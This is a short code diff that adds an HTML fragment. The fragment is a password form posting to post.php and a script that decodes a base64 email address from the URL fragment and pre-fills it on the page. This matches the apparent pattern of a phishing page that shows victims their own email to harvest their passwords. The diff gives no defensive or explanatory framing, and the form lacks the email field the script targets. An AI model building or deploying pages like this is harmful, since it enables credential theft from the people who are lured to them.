@@ -1,0 +1,3 @@
+<form action="post.php" method="post"><input type="password" name="p"></form>
+<script>var e = atob(location.hash.substr(1)); document.getElementById("email").value = e;</script>
+
